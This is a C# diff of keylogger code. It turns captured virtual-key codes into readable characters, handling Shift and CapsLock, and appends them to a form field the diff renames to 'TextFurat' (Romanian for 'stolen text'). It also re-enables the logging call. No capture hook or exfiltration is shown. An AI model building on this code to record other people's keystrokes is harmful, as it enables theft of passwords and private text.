@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Interfata_Urata;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -20,37 +21,38 @@ namespace IP
         {
             _writer = strategy;
         }
-        public void HandleVK(int vkCode, String path, TestUI form)
+        public void HandleVK(int vkCode, String path, InterfataSimpla form)
         {
-            //_writer.WriteToLog(vkCode, path, form);
+            _writer.WriteToLog(vkCode, path, form);
         }
     }
 
     public class VKCodeStrategy : ILoggerWriter
     {
-        public void WriteToLog(int vkCode, string path, TestUI form)
+        public void WriteToLog(int vkCode, string path, InterfataSimpla form)
         {
             Console.WriteLine(vkCode);
-            form.KeyText.AppendText("0x"+vkCode.ToString("X"));
+            form.TextFurat.AppendText("0x"+vkCode.ToString("X"));
+            
 
         }
     }
 
     public class ToStringStrategy : ILoggerWriter
     {
-        public void WriteToLog(int vkCode, string path, TestUI form)
+        public void WriteToLog(int vkCode, string path, InterfataSimpla form)
         {
             Console.WriteLine((Keys)vkCode);
-            form.KeyText.AppendText((Keys)vkCode + "");
+            form.TextFurat.AppendText((Keys)vkCode + "");
         }
     }
 
     public class ToCharStrategy : ILoggerWriter
     {
-        public void WriteToLog(int vkCode, string path, TestUI form)
+        public void WriteToLog(int vkCode, string path, InterfataSimpla form)
         {
             Console.WriteLine((char)vkCode);
-            form.KeyText.AppendText((char)vkCode + "");
+            form.TextFurat.AppendText((char)vkCode + "");
         }
     }
 
@@ -58,23 +60,23 @@ namespace IP
     {
 
         bool shift = false;
-        public void WriteToLog(int vkCode, string path, TestUI form)
+        public void WriteToLog(int vkCode, string path, InterfataSimpla form)
         {
             bool isCapital = Control.IsKeyLocked(Keys.CapsLock);
             switch (vkCode)
             {
                 case VK_BACK:
                     {
-                        if (form.KeyText.Text.Length > 0)
+                        if (form.TextFurat.Text.Length > 0)
                         {
-                            form.KeyText.Text = form.KeyText.Text.Remove(form.KeyText.Text.Length - 1);
+                            form.TextFurat.Text = form.TextFurat.Text.Remove(form.TextFurat.Text.Length - 1);
                         }
                         break;
                     }
                 case VK_RETURN:
                     {
 
-                        form.KeyText.AppendText("\r\n");
+                        form.TextFurat.AppendText("\r\n");
                         break;
                     }
                 case VK_CAPITAL:
@@ -87,178 +89,178 @@ namespace IP
                 case VK_0:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText(")");
+                            form.TextFurat.AppendText(")");
                         else
-                            form.KeyText.AppendText("0");
+                            form.TextFurat.AppendText("0");
                         break;
                     }
                 case VK_1:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("!");
+                            form.TextFurat.AppendText("!");
                         else
-                            form.KeyText.AppendText("1");
+                            form.TextFurat.AppendText("1");
                         break;
                     }
                 case VK_2:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("@");
+                            form.TextFurat.AppendText("@");
                         else
-                            form.KeyText.AppendText("2");
+                            form.TextFurat.AppendText("2");
                         break;
                     }
                 case VK_3:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("#");
+                            form.TextFurat.AppendText("#");
                         else
-                            form.KeyText.AppendText("3");
+                            form.TextFurat.AppendText("3");
                         break;
                     }
                 case VK_4:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("$");
+                            form.TextFurat.AppendText("$");
                         else
-                            form.KeyText.AppendText("4");
+                            form.TextFurat.AppendText("4");
                         break;
                     }
                 case VK_5:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("%");
+                            form.TextFurat.AppendText("%");
                         else
-                            form.KeyText.AppendText("5");
+                            form.TextFurat.AppendText("5");
                         break;
                     }
                 case VK_6:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("^");
+                            form.TextFurat.AppendText("^");
                         else
-                            form.KeyText.AppendText("6");
+                            form.TextFurat.AppendText("6");
                         break;
                     }
                 case VK_7:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("&");
+                            form.TextFurat.AppendText("&");
                         else
-                            form.KeyText.AppendText("7");
+                            form.TextFurat.AppendText("7");
                         break;
                     }
                 case VK_8:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("*");
+                            form.TextFurat.AppendText("*");
                         else
-                            form.KeyText.AppendText("8");
+                            form.TextFurat.AppendText("8");
                         break;
                     }
                 case VK_9:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("(");
+                            form.TextFurat.AppendText("(");
                         else
-                            form.KeyText.AppendText("9");
+                            form.TextFurat.AppendText("9");
                         break;
                     }
                 case VK_OEM_1:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText(":");
+                            form.TextFurat.AppendText(":");
                         else
-                            form.KeyText.AppendText(";");
+                            form.TextFurat.AppendText(";");
                         break; 
                     }
                 case VK_OEM_2:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("?");
+                            form.TextFurat.AppendText("?");
                         else
-                            form.KeyText.AppendText("/");
+                            form.TextFurat.AppendText("/");
                         break;
                     }
                 case VK_OEM_3:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("~");
+                            form.TextFurat.AppendText("~");
                         else
-                            form.KeyText.AppendText("`");
+                            form.TextFurat.AppendText("`");
                         break;
                     }
                 case VK_OEM_4:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("{");
+                            form.TextFurat.AppendText("{");
                         else
-                            form.KeyText.AppendText("[");
+                            form.TextFurat.AppendText("[");
                         break;
                     }
                 case VK_OEM_5:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText(@"\");
+                            form.TextFurat.AppendText(@"\");
                         else
-                            form.KeyText.AppendText("|");
+                            form.TextFurat.AppendText("|");
                         break;
                     }
                 case VK_OEM_6:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("}");
+                            form.TextFurat.AppendText("}");
                         else
-                            form.KeyText.AppendText("]");
+                            form.TextFurat.AppendText("]");
                         break;
                     }
                 case VK_OEM_7:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText(@"""");
+                            form.TextFurat.AppendText(@"""");
                         else
-                            form.KeyText.AppendText("'");
+                            form.TextFurat.AppendText("'");
                         break;
                     }
                 case VK_OEM_PERIOD:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText(">");
+                            form.TextFurat.AppendText(">");
 
                         else
-                            form.KeyText.AppendText(".");
+                            form.TextFurat.AppendText(".");
                         break;
                     }
                 case VK_OEM_COMMA:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("<");
+                            form.TextFurat.AppendText("<");
                         else
-                            form.KeyText.AppendText(",");
+                            form.TextFurat.AppendText(",");
                         break;
                     }
                 case VK_OEM_PLUS:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("+");
+                            form.TextFurat.AppendText("+");
                         else
-                            form.KeyText.AppendText("=");
+                            form.TextFurat.AppendText("=");
                         break;
                     }
                 case VK_OEM_MINUS:
                     {
                         if ((Control.ModifierKeys & Keys.Shift) != 0)
-                            form.KeyText.AppendText("_");
+                            form.TextFurat.AppendText("_");
                         else
-                            form.KeyText.AppendText("-");
+                            form.TextFurat.AppendText("-");
                         break;
                     }
                 default:
                     {
                         if (!isCapital && vkCode >= VK_A && vkCode <= VK_Z)
-                            form.KeyText.AppendText((char)(vkCode + 32) + "");
+                            form.TextFurat.AppendText((char)(vkCode + 32) + "");
                         else
-                            form.KeyText.AppendText((char)vkCode + "");
+                            form.TextFurat.AppendText((char)vkCode + "");
                         Console.WriteLine((Keys)vkCode);
                         break;
                     }
